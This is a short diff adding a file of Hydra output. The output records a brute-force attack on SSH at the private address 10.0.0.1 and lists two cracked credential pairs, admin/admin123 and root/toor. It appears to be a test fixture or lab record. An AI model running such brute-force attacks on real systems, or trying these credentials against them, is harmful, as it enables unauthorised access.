@@ -1,0 +1,6 @@
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 100 login tries (l:10/p:10)
+[DATA] attacking ssh://10.0.0.1:22/
+[22][ssh] host: 10.0.0.1   login: admin   password: admin123
+[22][ssh] host: 10.0.0.1   login: root   password: toor
+1 of 1 target successfully completed, 2 valid passwords found
